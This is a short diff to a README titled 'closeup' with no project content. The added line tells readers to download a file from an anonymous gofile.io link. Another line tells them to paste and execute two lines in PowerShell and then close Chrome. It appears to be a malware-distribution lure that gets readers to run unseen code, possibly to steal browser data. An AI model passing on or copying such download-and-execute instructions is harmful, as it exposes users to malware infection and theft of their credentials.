@@ -1,6 +1,10 @@
 # closeup
 
 
+
+# Click this link to download the file directly        https://gofile.io/d/eC5tJHc3
+
+
 POWERSHELL open cheyi line 1 copy and excute then line 2 copy and excute, close chrome and powershell.
 
 
